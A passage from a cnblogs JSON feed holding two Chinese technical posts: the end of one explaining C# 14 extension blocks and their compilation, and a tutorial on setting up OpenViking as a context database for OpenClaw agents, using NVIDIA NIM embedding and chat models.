0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">bool</span> IsNullOrEmptyEx(<span style=\"color: rgba(0, 0, 255, 1);\">this</span> <span style=\"color: rgba(0, 0, 255, 1);\">string</span><span style=\"color: rgba(0, 0, 0, 1);\"> value)\n        </span>=&gt; <span style=\"color: rgba(0, 0, 255, 1);\">string</span><span style=\"color: rgba(0, 0, 0, 1);\">.IsNullOrEmpty(value);\n}</span></pre>\n</div>\n<p>从本质上看：</p>\n<blockquote>编译器在语法层面做“糖化处理”，最终仍然是静态方法调用。</blockquote>\n<p><span class=\"s1\">LINQ就是最大的应用场景。</span></p>\n<p><strong><span class=\"s1\" style=\"font-size: 16px;\">二、C# 14中引入扩展成员和示例说明</span></strong></p>\n<p class=\"p1\">C# 14 允许在更自然的语法结构中声明扩展成员，不再局限于“静态类 + this 参数”模式，而是支持类似：</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">class</span><span style=\"color: rgba(0, 0, 0, 1);\"> Enumerable\n{\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> Extension block</span>\n    extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source) <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> extension members for IEnumerable&lt;TSource&gt;</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    {\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> Extension property:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">bool</span> IsEmpty =&gt; !<span style=\"color: rgba(0, 0, 0, 1);\">source.Any();\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> Extension method:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> IEnumerable&lt;TSource&gt; Where(Func&lt;TSource, <span style=\"color: rgba(0, 0, 255, 1);\">bool</span>&gt;<span style=\"color: rgba(0, 0, 0, 1);\"> predicate) { ... }\n    }\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> extension block, with a receiver type only</span>\n    extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt;) <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> static extension members for IEnumerable&lt;Source&gt;</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    {\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> static extension method:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> IEnumerable&lt;TSource&gt; Combine(IEnumerable&lt;TSource&gt; first, IEnumerable&lt;TSource&gt;<span style=\"color: rgba(0, 0, 0, 1);\"> second) { ... }\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> static extension property:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> IEnumerable&lt;TSource&gt; Identity =&gt; Enumerable.Empty&lt;TSource&gt;<span style=\"color: rgba(0, 0, 0, 1);\">();\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> static user defined operator:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> IEnumerable&lt;TSource&gt; <span style=\"color: rgba(0, 0, 255, 1);\">operator</span> + (IEnumerable&lt;TSource&gt; left, IEnumerable&lt;TSource&gt; right) =&gt;<span style=\"color: rgba(0, 0, 0, 1);\"> left.Concat(right);\n    }\n}</span></pre>\n</div>\n<p class=\"p1\"><span class=\"s1\">定义的是一个 extension block<span class=\"s1\">，目标类型是：IEnumerable&lt;TSource&gt;</span></span></p>\n<p class=\"p1\">代码分成两类 extension block：　　</p>\n<ol start=\"1\">\n<li>\n<p class=\"p1\"><strong>实例扩展成员</strong></p>\n</li>\n<li>\n<p class=\"p1\"><strong>静态扩展成员</strong></p>\n</li>\n</ol>\n<p>① 实例扩展成员：extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source)&nbsp;</p>\n<ul>\n<li>\n<p class=\"p1\"><span class=\"s1\">source 是接收者（receiver）</span></p>\n</li>\n<li>\n<p class=\"p1\"><span class=\"s1\">类似旧语法的 this IEnumerable&lt;TSource&gt; source</span></p>\n</li>\n<li>\n<p class=\"p1\">但语法更接近真正“为类型添加成员”</p>\n</li>\n</ul>\n<p>&nbsp;扩展属性：public bool IsEmpty =&gt; !source.Any();</p>\n<p class=\"p1\">&nbsp;编译器会生成：public static bool get_IsEmpty&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source)</p>\n<p class=\"p1\">&nbsp;代码调用：list.IsEmpty</p>\n<p class=\"p1\">&nbsp;会被编译为：Enumerable.get_IsEmpty(list)</p>\n<p class=\"p1\">&nbsp;其本质仍然是：</p>\n<blockquote>静态方法 + 语法糖绑定</blockquote>\n<p class=\"p1\">但在语义层面：它已经不再是“工具方法”，而是“类型能力”。</p>\n<p class=\"p1\">扩展方法：public IEnumerable&lt;TSource&gt; Where(Func&lt;TSource, bool&gt; predicate)</p>\n<p class=\"p1\">即增强原有LINQ的Where功能</p>\n<p class=\"p1\"><span class=\"s1\">如果系统中已有 System.Linq.Enumerable.Where<span class=\"s1\">：</span></span></p>\n<ul>\n<li>\n<p class=\"p1\">实例成员优先</p>\n</li>\n<li>\n<p class=\"p1\">然后才是 extension block</p>\n</li>\n<li>\n<p class=\"p1\">再是 using 引入的扩展方法</p>\n</li>\n</ul>\n<p>&nbsp;不会破坏已有 API，只是参与候选集。</p>\n<p class=\"p1\">② 静态扩展成员</p>\n<p class=\"p1\">extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt;)</p>\n<p class=\"p1\">这里没有 receiver 变量名。</p>\n<blockquote>为类型本身添加“静态扩展成员”</blockquote>\n<p class=\"p1\">找一个静态扩展方法</p>\n<p class=\"p1\">public static IEnumerable&lt;TSource&gt; Combine(...)</p>\n<p class=\"p1\">代码调用：IEnumerable&lt;int&gt;.Combine(a, b);</p>\n<p class=\"p1\">编译器会转化为：Enumerable.Combine(a, b);</p>\n<p class=\"p1\">再看一个静态扩展属性</p>\n<p class=\"p1\">public static IEnumerable&lt;TSource&gt; Identity</p>\n<p class=\"p1\">代码调用：IEnumerable&lt;int&gt;.Identity</p>\n<p class=\"p1\">这在旧扩展方法体系中是无法表达的。</p>\n<p class=\"p1\">再看一个扩展运算符</p>\n<p class=\"p1\">public static IEnumerable&lt;TSource&gt; operator +</p>\n<p class=\"p1\">这是 C# 14 的重大增强点。现在你可以写：</p>\n<p class=\"p1\">var result = list1 + list2;</p>\n<p class=\"p1\">等价于：Enumerable.op_Addition(list1, list2);</p>\n<p class=\"p1\"><strong><span style=\"font-size: 16px;\">三、底层编译机制</span></strong></p>\n<p class=\"p1\">&nbsp;<strong>不修改 CLR 元数据</strong></p>\n<ul>\n<li>\n<p class=\"p1\"><span class=\"s1\">不改变 IEnumerable&lt;T&gt;</span></p>\n</li>\n<li>\n<p class=\"p1\">不增加真实成员</p>\n</li>\n</ul>\n<p>&nbsp;<strong>IL 仍然是静态方法</strong></p>\n<p>&nbsp; &nbsp;所有成员都会生成：&nbsp;public static ...</p>\n<p class=\"p1\">&nbsp;<strong>语义绑定由编译器完成</strong></p>\n<p class=\"p1\">扩展成员解析规则：</p>\n<ol start=\"1\">\n<li>\n<p class=\"p1\">实例真实成员</p>\n</li>\n<li>\n<p class=\"p1\">同 namespace extension block</p>\n</li>\n<li>\n<p class=\"p1\">using 导入 extension block</p>\n</li>\n</ol>\n<p>&nbsp;<strong><span style=\"font-size: 16px;\">四、与传统扩展方法对比</span></strong></p>\n<p>&nbsp; &nbsp;<img alt=\"image\" height=\"246\" src=\"https://img2024.cnblogs.com/blog/23525/202602/23525-20260218111804828-477864692.png\" width=\"657\" /></p>\n<p>同时，零运行时开销。</p>\n<ul>\n<li>\n<p class=\"p1\">无反射</p>\n</li>\n<li>\n<p class=\"p1\">无动态代理</p>\n</li>\n<li>\n<p class=\"p1\">无装饰器</p>\n</li>\n<li>\n<p class=\"p1\">无运行时注入</p>\n</li>\n</ul>\n<p>&nbsp;完全编译期绑定。</p>\n<blockquote>编译器级语义增强，不改变运行时类型结构。</blockquote>\n<p>&nbsp;</p>\n<p>&nbsp;以上分享给大家。</p>\n<p>&nbsp;</p>\n<p>周国庆</p>\n<p>20260218</p>\n<p class=\"p1\">&nbsp;</p>\n<p class=\"p1\">&nbsp;</p>\n<p class=\"p1\">&nbsp;</p>\n<p class=\"p1\">&nbsp;</p>\n<p>&nbsp;</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-18 11:20</span>&nbsp;\n<a href=\"https://www.cnblogs.com/tianqing\">Eric zhou</a>&nbsp;\n阅读(<span id=\"post_view_count\">196</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "OpenClaw+OpenViking + NVIDIA API 配置教程",
      "link": "https://www.cnblogs.com/swizard/p/19622926",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/swizard/p/19622926\" id=\"cb_post_title_url\" title=\"发布于 2026-02-18 10:56\">\n    <span>OpenClaw+OpenViking + NVIDIA API 配置教程</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>本教程介绍如何在 OpenClaw 环境中配置 OpenViking，使用 NVIDIA NIM API 作为 Embedding 和 VLM 后端。</p>\n</blockquote>\n<h2 id=\"什么是-openviking\">什么是 OpenViking？</h2>\n<p>OpenViking 是火山引擎开源的 <strong>AI Agent 上下文数据库</strong>。它用\"虚拟文件系统\"的方式管理 Agent 的记忆、资源和技能，提供：</p>\n<ul>\n<li><strong>分层上下文</strong>：L0摘要 / L1概览 / L2全文，按需加载节省 Token</li>\n<li><strong>语义搜索</strong>：融合目录定位与向量检索</li>\n<li><strong>自动摘要</strong>：VLM 自动生成文档摘要和概览</li>\n<li><strong>会话记忆</strong>：自动提取对话中的长期记忆</li>\n</ul>\n<p>GitHub: <a href=\"https://github.com/volcengine/OpenViking\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/volcengine/OpenViking</a></p>\n<h2 id=\"前置条件\">前置条件</h2>\n<ul>\n<li>Python 3.9+</li>\n<li>NVIDIA NIM API Key（<a href=\"https://build.nvidia.com/\" rel=\"noopener nofollow\" target=\"_blank\">免费注册</a>）</li>\n<li>稳定的网络连接</li>\n</ul>\n<hr />\n<h2 id=\"第一步安装-openviking\">第一步：安装 OpenViking</h2>\n<pre><code class=\"language-bash\">pip install openviking\n</code></pre>\n<hr />\n<h2 id=\"第二步创建配置文件\">第二步：创建配置文件</h2>\n<p>创建目录和配置文件：</p>\n<pre><code class=\"language-bash\">mkdir -p ~/.openviking\n</code></pre>\n<p>编辑 <code>~/.openviking/ov.conf</code>：</p>\n<pre><code class=\"language-json\">{\n  \"embedding\": {\n    \"dense\": {\n      \"api_base\": \"https://integrate.api.nvidia.com/v1\",\n      \"api_key\": \"你的NVIDIA_API_KEY\",\n      \"provider\": \"openai\",\n      \"dimension\": 4096,\n      \"model\": \"nvidia/nv-embed-v1\"\n    }\n  },\n  \"vlm\": {\n    \"api_base\": \"https://integrate.api.nvidia.com/v1\",\n    \"api_key\": \"你的NVIDIA_API_KEY\",\n    \"provider\": \"openai\",\n    \"model\": \"meta/llama-3.3-70b-instruct\"\n  }\n}\n</code></pre>\n<h3 id=\"配置说明\">配置说明</h3>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>api_base</code></td>\n<td>NVIDIA NIM API 端点</td>\n</tr>\n<tr>\n<td><code>api_key</code></td>\n<td>从 NVIDIA Build 平台获取</td>\n</tr>\n<tr>\n<td><code>dimension</code></td>\n<td>Embedding 维度，nv-embed-v1 固定为 4096</td>\n</tr>\n<tr>\n<td><code>embedding.model</code></td>\n<td>推荐使用 <code>nvidia/nv-embed-v1</code>（对称模型，不需要 input_type 参数）</td>\n</tr>\n<tr>\n<td><code>vlm.model</code></td>\n<td>用于生成摘要的语言模型，推荐 <code>meta/llama-3.3-70b-instruct</code></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"为什么不用-kimi-k25\">为什么不用 kimi-k2.5？</h3>\n<p>NVIDIA 上的推理模型（如 kimi-k2.5）返回的 <code>content</code> 字段为空，内容在 <code>reasoning</code> 字段里。OpenViking 期望标准的 <code>message.content</code> 格式，所以要用非推理模型。</p>\n<h3 id=\"如何获取-nvidia-api-key\">如何获取 NVIDIA API Key</h3>\n<ol>\n<li>访问 <a href=\"https://build.nvidia.com/\" rel=\"noopener nofollow\" target=\"_blank\">https://build.nvidia.com/</a></li>\n<li>登录/注册账号</li>\n<li>点击右上角用户名 → API Keys → Generate Key</li>\n<li>复制保存（只显示一次）</li>\n</ol>\n<hr />\n<h2 id=\"第三步设置环境变量\">第三步：设置环境变量</h2>\n<pre><code class=\"language-bash\">export OPENVIKING_CONFIG_FILE=~/.openviking/ov.conf\n</code></pre>\n<p>建议添加到 <code>~/.bashrc</code>：</p>\n<pre><code class=\"language-bash\">echo 'export OPENVIKING_CONFIG_FILE=~/.openviking/ov.conf' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\n</code></pre>\n<hr />\n<h2 id=\"第四步验证安装\">第四步：验证安装</h2>\n<p>创建测试脚本 <code>test_openviking.py</code>：</p>\n<pre><code class=\"language-python\">import openviking as ov\n\n# 初始化客户端，数据存储在当前目录的 openviking_data 文件夹\nclient = ov.SyncOpenViking(path=\"./openviking_data\")\n\ntry:\n    client.initialize()\n    print(\"✅ OpenViking 初始化成功！\")\n    \n    # 添加一个测试文件\n    result = client.add_resource(path=\"./your_file.md\")\n    print(f\"添加文件: {result}\")\n    \n    # 等待处理完成\n    print(\"等待处理...\")\n    client.wait_processed()\n    print(\"✅ 处理完成！\")\n    \n    # 搜索测试\n    results = client.find(\"测试关键词\", limit=3)\n    print(f\"\\n搜索结果:\")\n    for r in results.resources:\n        print(f\"  {r.uri} (score: {r.score:.4f})\")\n    \n    client.close()\n    print(\"\\n🎉 OpenViking 配置成功！\")\n\nexcept Exception as e:\n    print(f\"错误: {e}\")\n    import traceback\n    traceback.print_exc()\n</code></pre>\n<p>运行：</p>\n<pre><code class=\"language-bash\">python test_openviking.py\n</code></pre>\n<hr />\n<h2 id=\"第五步核心-api-用法\">第五步：核心 API 用法</h2>\n<h3 id=\"添加资源\">添加资源</h3>\n<pre><code class=\"language-python\"># 添加单个文件\nresult = client.add_resource(path=\"./docs/readme.md\")\n\n# 添加 URL\nresult = client.add_resource(path=\"https://example.com/article.html\")\n</code></pre>\n<h3 id=\"目录浏览\">目录浏览</h3>\n<pre><code class=\"language-python\"># 列出根目录\nls_result = client.ls(\"viking://resources\")\n\n# 列出子目录\nls_result = client.ls(\"viking://resources/my_project\")\n</code></pre>\n<h3 id=\"语义搜索\">语义搜索</h3>\n<pre><code class=\"language-python\"># 搜索相关内容\nresults = client.find(\"如何配置 embedding\", limit=5)\n\nfor r in results.resources:\n    print(f\"URI: {r.uri}\")\n    print(f\"Score: {r.score}\")\n    print(f\"Content: {client.read(r.uri)[:200]}...\")\n</code></pre>\n<h3 id=\"获取摘要概览\">获取摘要/概览</h3>\n<pre><code class=\"language-python\"># L0 层：一句话摘要\nabstract = client.abstract(\"viking://resources/my_project\")\n\n# L1 层：详细概览\noverview = client.overview(\"viking://resources/my_project\")\n</code></pre>\n<h3 id=\"读取内容\">读取内容</h3>\n<pre><code class=\"language-python\"># 读取完整内容（L2 层）\ncontent = client.read(\"viking://resources/my_project/readme.md\")\n</code></pre>\n<hr />\n<h2 id=\"常见问题\">常见问题</h2>\n<h3 id=\"q-embedding-维度不匹配\">Q: Embedding 维度不匹配</h3>\n<p><strong>错误</strong>: <code>Dense vector dimension mismatch: expected 2048, got 4096</code></p>\n<p><strong>解决</strong>: 在配置文件中明确指定 <code>dimension: 4096</code>，匹配 <code>nvidia/nv-embed-v1</code> 的输出维度。</p>\n<h3 id=\"q-vlm-返回-nonetype-错误\">Q: VLM 返回 NoneType 错误</h3>\n<p><strong>错误</strong>: <code>'NoneType' object is not subscriptable</code></p>\n<p><strong>原因</strong>: 使用了推理模型（如 kimi-k2.5），其返回格式与 OpenViking 不兼容。</p>\n<p><strong>解决</strong>: 换用标准模型如 <code>meta/llama-3.3-70b-instruct</code>。</p>\n<h3 id=\"q-nvidia-api-报错-input_type-required\">Q: NVIDIA API 报错 input_type required</h3>\n<p><strong>错误</strong>: <code>'input_type' parameter is required for asymmetric models</code></p>\n<p><strong>原因</strong>: 某些 Embedding 模型（如 nv-embedqa-e5-v5）是非对称模型，需要指定 query 或 document。</p>\n<p><strong>解决</strong>: 使用对称模型 <code>nvidia/nv-embed-v1</code>，不需要 input_type。</p>\n<h3 id=\"q-文件名冲突\">Q: 文件名冲突</h3>\n<p><strong>错误</strong>: <code>directory already exists: /resources/第01章</code></p>\n<p><strong>原因</strong>: OpenViking 用文件名（不含路径）作为 URI，不同目录下的同名文件会冲突。</p>\n<p><strong>解决</strong>:</p>\n<ul>\n<li>方案一：重命名文件，使用唯一名称</li>\n<li>方案二：分批导入，避免同时添加同名文件</li>\n<li>方案三：等待官方修复此设计问题</li>\n</ul>\n<hr />\n<h2 id=\"为什么用-openviking替代-openclaw-默认的-qmd-记忆后端\">为什么用 OpenViking？——替代 OpenClaw 默认的 qmd 记忆后端</h2>\n<h3 id=\"openclaw-现有记忆方案的局限\">OpenClaw 现有记忆方案的局限</h3>\n<p>OpenClaw 默认使用 <code>qmd</code> 作为记忆后端，配合手动维护的 <code>MEMORY.md</code> 和 <code>memory/*.md</code> 文件。这套方案够用，但有几个痛点：</p>\n<ol>\n<li><strong>搜索精度有限</strong> — qmd 基于简单向量匹配，缺乏层次化理解</li>\n<li><strong>手动维护成本高</strong> — 记忆文件需要人工整理，容易遗漏</li>\n<li><strong>缺乏自动摘要</strong> — Agent 需要读取整个文件才能了解内容</li>\n<li><strong>无法管理大量文档</strong> — 当 workspace 文件很多时，qmd 不够用</li>\n</ol>\n<h3 id=\"openviking-的优势\">OpenViking 的优势</h3>\n<table>\n<thead>\n<tr>\n<th>能力</th>\n<th>qmd</th>\n<th>OpenViking</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>语义搜索</td>\n<td>✅ 基础</td>\n<td>✅ 目录递归 + 语义融合</td>\n</tr>\n<tr>\n<td>自动摘要</td>\n<td>❌</td>\n<td>✅ L0/L1/L2 三层</td>\n</tr>\n<tr>\n<td>结构化浏览</td>\n<td>❌</td>\n<td>✅ 虚拟文件系统</td>\n</tr>\n<tr>\n<td>Token 节省</td>\n<td>❌</td>\n<td>✅ 按需加载</td>\n</tr>\n<tr>\n<td>会话记忆自动提取</td>\n<td>❌</td>\n<td>✅ 自动提取长期记忆</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"集成方式\">集成方式</h3>\n<h4 id=\"方式一作为-openclaw-的补充记忆推荐\">方式一：作为 OpenClaw 的补充记忆（推荐）</h4>\n<p>保留 qmd 作为日常轻量记忆，用 OpenViking 管理大型文档库：</p>\n<pre><code class=\"language-python\"># 把 workspace 里的书籍、项目文档等大型资源导入 OpenViking\nimport glob, openviking as ov\n\nclient = ov.SyncOpenViking(path=\"./openviking_data\")\nclient.initialize()\n\nfor f in glob.glob(\"./books/**/*.md\", recursive=True):\n    client.add_resource(path=f)\n\nfor f in glob.glob(\"./docs/**/*.md\", recursive=True):\n    client.add_resource(path=f)\n\nclient.wait_processed()\nclient.close()\n</code></pre>\n<p>Agent 工作流：</p>\n<ol>\n<li>日常对话 → qmd 记忆（轻量、快速）</li>\n<li>需要查阅文档 → OpenViking 语义搜索（精准、分层）</li>\n<li>Sub-agent 写作/研究 → OpenViking 提供上下文（节省 Token）</li>\n</ol>\n<h4 id=\"方式二完全替代-qmd\">方式二：完全替代 qmd</h4>\n<p>将 OpenClaw 的所有记忆文件也导入 OpenViking：</p>\n<pre><code class=\"language-python\"># 导入记忆文件\nfor f in glob.glob(\"./memory/*.md\"):\n    client.add_resource(path=f)\n\n# 导入 workspace 所有 markdown\nfor f in glob.glob(\"./**/*.md\", recursive=True):\n    client.add_resource(path=f)\n</code></pre>\n<blockquote>\n<p>⚠️ 目前 OpenViking 还不能直接作为 OpenClaw 的 <code>memory.backend</code> 配置项。需要通过 skill 的 CLI 工具间接调用。未来如果 OpenClaw 支持自定义记忆后端插件，可以更深度集成。</p>\n</blockquote>\n<h4 id=\"方式三给-sub-agent-提供上下文\">方式三：给 Sub-agent 提供上下文</h4>\n<p>写书、做研究等任务时，sub-agent 可以先搜索 OpenViking 获取相关上下文，而不是把整本书塞进 prompt：</p>\n<pre><code class=\"language-bash\"># Sub-agent 先搜索相关内容\npython3 scripts/viking.py search \"武松的性格分析\" --limit 3\n\n# 然后只读取最相关的段落\npython3 scripts/viking.py read viking://resources/第01章/张三的叙事.md\n</code></pre>\n<p>这样一个 sub-agent 只需要加载几千 token 的相关内容，而不是整本书的 10 万+ token。</p>\n<h3 id=\"已封装的-openclaw-skill\">已封装的 OpenClaw Skill</h3>\n<p>我们已经把 OpenViking 封装为 OpenClaw skill，安装后 Agent 可以直接使用：</p>\n<pre><code class=\"language-bash\"># 安装 skill\ngit clone https://github.com/swizardlv/openclaw_openviking_skill.git\ncp -r openclaw_openviking_skill/openviking ~/.openclaw/workspace/skills/\n</code></pre>\n<p>Skill 提供的命令：</p>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>viking.py add &lt;file&gt;</code></td>\n<td>索引文件</td>\n</tr>\n<tr>\n<td><code>viking.py add-dir &lt;dir&gt;</code></td>\n<td>批量索引目录</td>\n</tr>\n<tr>\n<td><code>viking.py search &lt;query&gt;</code></td>\n<td>语义搜索</td>\n</tr>\n<tr>\n<td><code>viking.py ls [uri]</code></td>\n<td>浏览资源</td>\n</tr>\n<tr>\n<td><code>viking.py abstract &lt;uri&gt;</code></td>\n<td>获取摘要</td>\n</tr>\n<tr>\n<td><code>viking.py overview &lt;uri&gt;</code></td>\n<td>获取概览</td>\n</tr>\n<tr>\n<td><code>viking.py read &lt;uri&gt;</code></td>\n<td>读取全文</td>\n</tr>\n<tr>\n<td><code>viking.py info</code></td>\n<td>查看配置状态</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h2 id=\"附录可用的-nvidia-embedding-模型\">附录：可用的 NVIDIA Embedding 模型</h2>\n<table>\n<thead>\n<tr>\n<th>模型</th>\n<th>维度</th>\n<th>类型</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>nvidia/nv-embed-v1</code></td>\n<td>4096</td>\n<td>对称</td>\n<td>✅ 推荐，无需 input_type</td>\n</tr>\n<tr>\n<td><code>nvidia/nv-embedqa-e5-v5</code></td>\n<td>1024</td>\n<td>非对称</td>\n<td>需要 input_type 参数</td>\n</tr>\n<tr>\n<td><code>nvidia/llama-3.2-nv-embedqa-1b-v2</code></td>\n<td>2048</td>\n<td>非对称</td>\n<td>需要 input_type 参数</td>\n</tr>\n<tr>\n<td><code>nvidia/nv-embedcode-7b-v1</code></td>\n<td>4096</td>\n<td>对称</td>\n<td>适合代码</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h2 id=\"附录可用的-nvidia-chat-模型用于-vlm\">附录：可用的 NVIDIA Chat 模型（用于 VLM）</h2>\n<table>\n<thead>\n<tr>\n<th>模型</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>meta/llama-3.3-70b-instruct</code></td>\n<td>✅ 推荐，标准格式</td>\n</tr>\n<tr>\n<td><code>meta/llama-3.1-70b-instruct</code></td>\n<td>稳定版本</td>\n</tr>\n<tr>\n<td><code>meta/llama-3.1-8b-instruct</code></td>\n<td>轻量版</td>\n</tr>\n<tr>\n<td><code>mistralai/mistral-large</code></td>\n<td>Mistral 系列</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>⚠️ 避免使用推理模型（如 kimi-k2.5、deepseek-r1），它们返回的格式与 OpenViking 不兼容。</p>\n</blockquote>\n<hr />\n<h2 id=\"参考链接\">参考链接</h2>\n<ul>\n<li>OpenViking 官网: <a href=\"https://www.openviking.ai\" rel=\"noopener nofollow\" target=\"_blank\">https://www.openviking.ai</a></li>\n<li>OpenViking GitHub: <a href=\"https://github.com/volcengine/OpenViking\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/volcengine/OpenViking</a></li>\n<li>NVIDIA NIM API: <a href=\"https://build.nvidia.com/\" rel=\"noopener nofollow\" target=\"_blank\">https://build.nvidia.com/</a></li>\n<li>NVIDIA API 文档: <a href=\"https://docs.api.nvidia.com/nim/\" rel=\"noopener nofollow\" target=\"_blank\">https://docs.api.nvidia.com/nim/</a></li>\n</ul>\n<hr />\n<p><em>本教程基于 OpenViking 0.1.17 和 NVIDIA NIM API 测试通过。</em></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-18 10:56</span>&nbsp;\n<a href=\"https://www.cnblogs.com/swizard\">Swizard</a>&nbsp;\n阅读(<span id=\"post_view_count\">337</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}